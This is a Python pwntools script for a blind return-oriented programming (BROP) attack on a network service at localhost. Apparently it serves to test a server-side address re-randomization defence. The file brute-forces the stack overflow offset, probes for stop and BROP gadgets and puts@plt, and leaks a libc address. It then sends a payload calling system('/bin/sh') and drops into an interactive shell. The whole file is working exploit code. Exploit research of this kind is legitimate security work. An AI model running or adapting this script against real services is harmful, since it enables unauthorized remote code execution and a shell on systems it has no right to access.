from pwn import *
from LibcSearcher import *
import sys

host = 'localhost'
port = 10001

def get_overflow_length():
	i = 1
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send('a' * i)
			output = r.recv()
			r.close()
			if not b'No password' in output:
				return i - 1
			else:
				i += 1
		except EOFError:
			r.close()
			return i - 1

def get_stop_gadget(offset):
	addr = 0x4006d0 #0x400000
	while addr < 0x400800:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send(b'a' * offset + p64(addr))
			stop_gadget = b'a' * offset + p64(addr)
			open("stop_gadget", "w").write(str(stop_gadget))
			content = r.recv()
			r.close()
			if b'WelCome' in content:
				return addr
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass
	print("second try")
	addr = 0x4006d0 #0x400000
	while addr < 0x400800:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send(b'a' * offset + p64(addr))
			stop_gadget = b'a' * offset + p64(addr)
			open("stop_gadget", "w").write(str(stop_gadget))
			content = r.recv()
			r.close()
			if b'WelCome' in content:
				return addr
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass
	print("third try")
	addr = 0x4006d0 #0x400000
	while addr < 0x400800:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send(b'a' * offset + p64(addr))
			stop_gadget = b'a' * offset + p64(addr)
			open("stop_gadget", "w").write(str(stop_gadget))
			content = r.recv()
			r.close()
			if b'WelCome' in content:
				return addr
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass

# checks if the gadget pops 6 registers
def get_brop_gadget(offset, stop_gadget, addr):
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		r.send(b'a' * offset + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10)
		content = r.recv(timeout=0.1)
		r.close()
		return b'WelCome' in content
	except EOFError:
		r.close()
		return False
	except PwnlibException:
		return get_brop_gadget(offset, stop_gadget, addr)

# checks if it is not just a false alarm
def check_brop_gadget(offset, addr):
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		payload = b'a' * offset + p64(addr) + b'a' * 8 * 10
		r.sendline(payload)
		content = r.recv()
		r.close()
		return False
	except EOFError:
		r.close()
		return True
	except PwnlibException:
		return check_brop_gadget(offset, addr)

def find_brop_gadget(offset, stop_gadget):
	addr = 0x400900#0x400000
	while addr < 0x400a00:
		if get_brop_gadget(offset, stop_gadget, addr) and check_brop_gadget(offset, addr):
			return addr
		addr += 1
	print("second try")
	addr = 0x400900#0x400000
	while addr < 0x400a00:
		if get_brop_gadget(offset, stop_gadget, addr) and check_brop_gadget(offset, addr):
			return addr
		addr += 1
	print("third try")
	addr = 0x400900#0x400000
	while addr < 0x400a00:
		if get_brop_gadget(offset, stop_gadget, addr) and check_brop_gadget(offset, addr):
			return addr
		addr += 1

def find_puts(offset, rdi_ret, stop_gadget):
	addr = 0x400810#0x400000
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.sendline(b'a' * offset + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget))
			content = r.recv()
			if b'\x7fELF' in content:
				return addr
			r.close()
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass

def leak(offset, addr, rdi_ret, puts, stop_gadget):
	# print(hex(addr))
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		r.sendline(b'a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(stop_gadget))
		content = r.recvuntil('WelCome')
		r.close()
		try:
			content = content[:content.index('\nWelCome')]
		except:
			pass
		if content == '':
			content = '\x00'
		return content
	except PwnlibException:
		return leak(offset, addr, rdi_ret, puts, stop_gadget)
	except EOFError:
		r.close()
		return None


def leak_bytes(progress, offset, start, num_bytes, rdi_ret, puts, stop_gadget):
	# print(hex(start))
	addr = start
	res = b''
	while addr < (start + num_bytes):
		if progress:
			progress.status('Leaked 0x%x bytes' % (addr - start))
		data = leak(offset, addr, rdi_ret, puts, stop_gadget)
		if data is None:
			continue
		res += data
		addr += len(data)

	return res

def same_session_leak(r, offset, addr, rdi_ret, puts):
	main = 0x4006c7 #0x400697
	res = b''
	while len(res) < 8:
		r.sendline(b'a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(main))
		try:
			content = r.recvuntil('WelCome my friend,Do you know password?\n')
		except EOFError:
			sleep(0.5)
			continue
		try:
			content = content[:content.index('\nWelCome')]
		except:
			pass
		if content == '':
			content = '\x00'
		res += content
		addr += len(content)
	return res

def call_function(offset, func, rdi, rdi_ret, return_addr):
	return b'a' * offset + p64(4195966) + p64(rdi_ret) + p64(rdi) + p64(func) + p64(return_addr)
	#return b'a' * offset + p64(rdi_ret) + p64(rdi) + p64(func) + p64(return_addr)
	# 4195678 is the return gadget; get this from running get_gadgets.py

def info_message():
	print("Options:\n\n\t-rerand_faster_than_brop\n\t\t| Senario: attacker recon -> server rerand -> attacker deploy payload\n\t\t|\trerand in between recon and payload deploy makes addresses in payload outdated\n\t\t|\tand attacker will in turn deploy an outdated payload, thwarting attack\n\n\t-brop_faster_than_rerand\n\t\t| Senario: attacker recon -> attacker deploy payload -> server rerand\n\t\t|\trerand occurs after both payload recon and payload deploy which is too late\n\t\t|\tthe addresses in the payload are still valid when the payload is deployed\n")

if __name__ == '__main__':
	rand_beat_brop = 0
	if len(sys.argv) > 1:
		if sys.argv[1] == "-rerand_faster_than_brop":
			rand_beat_brop = 1
		elif sys.argv[1] == "-brop_faster_than_rerand":
			rand_beat_brop = 0
		else:
			info_message()
			exit()
	else:
		info_message()
		exit()
	print(rand_beat_brop) 
	print(sys.getrecursionlimit())
	sys.setrecursionlimit(1500)
	print(sys.getrecursionlimit())
	p = log.progress('Brute force search buffer overflow length')
	context.log_level = 'critical'  # suspend all logging
	offset = get_overflow_length()
	context.log_level = 'info'  # resume all logging
	p.success('Overflow starts after %d bytes' % offset)

	p = log.progress('Finding stop gadget')
	context.log_level = 'critical'  # suspend all logging
	stop_gadget = get_stop_gadget(offset)
	context.log_level = 'info'  # resume all logging
	p.success('Found stop gadget at 0x%x' % stop_gadget)

	p = log.progress('Finding brop gadget')
	context.log_level = 'critical'  # suspend all logging
	brop_gadget = find_brop_gadget(offset, stop_gadget)  # it seems that there may still be false alarms
	context.log_level = 'info'  # resume all logging
	p.success('Found brop gadget at 0x%x' % brop_gadget)

	p = log.progress('Finding puts@plt')
	pop_rdi_ret = brop_gadget + 9
	context.log_level = 'critical'  # suspend all logging
	puts = find_puts(offset, pop_rdi_ret, stop_gadget)
	context.log_level = 'info'  # resume all logging
	p.success('Found puts at 0x%x' % puts)

	sleep(4)

	# now the leaks all need to be in the same session because ASLR
	sleep(3)
	r = remote(host, port)
	r.recvuntil('WelCome my friend,Do you know password?\n')
	if rand_beat_brop == 1:
		r.recvuntil('Done printing plt\n')
		print("Received randomization event")
	# now that we have the binary, the rest is just normal rop
	p = log.progress('Leaking GOT entry of puts', level=logging.CRITICAL)
	context.log_level = 'critical'  # suspend all logging
	puts_got = 0x601018
	puts_libc = u64(same_session_leak(r, offset, puts_got, pop_rdi_ret, puts)[:8])
	print("After leaked libc, need to get libc version")
	# alternatively, use dynelf to resolve them, but somehow doesnt work...
	#dynelf_leak = lambda addr: same_session_leak(r, offset, addr, pop_rdi_ret, puts)[:8]
	#d = DynELF(dynelf_leak, pointer=puts)
	#puts_libc = d.lookup('puts', 'libc')

	context.log_level = 'info'  # resume all logging
	truncate_puts = puts_libc % 281474976710656 #- 6271825431066836992
	puts_libc = truncate_puts
	p.success('Leaked puts@libc: 0x%x' % puts_libc)


	libc = LibcSearcher('puts', puts_libc)

	libc_base = puts_libc - libc.dump('puts')
	libc_base = libc_base #- 6271825431066836992 # difference between what was computed and what the actual base was
	log.info('libc_base: 0x%x' % libc_base)
	binsh = libc_base + libc.dump('str_bin_sh')
	binsh_offset = binsh - libc_base
	log.info('binsh offset: 0x%x' % binsh_offset)
	system = libc_base + libc.dump('system') #'system')
	system_offset = system - libc_base
	log.info('system offset: 0x%x' % system_offset)

	# call system
	log.info('Calling system(\'/bin/sh\')')
	payload = call_function(offset, system, binsh, pop_rdi_ret, stop_gadget)
	open("payload", "w").write(str(payload))
	r.send(payload)
#	r.send(b'a' * offset + p64(pop_rdi_ret) + p64(libc_base) + p64(puts) + p64(stop_gadget))
#	content = r.recvuntil('WelCome')
#	r.sendline(payload)
#	r.send(b'a' * offset + p64(stop_gadget))
	r.interactive()


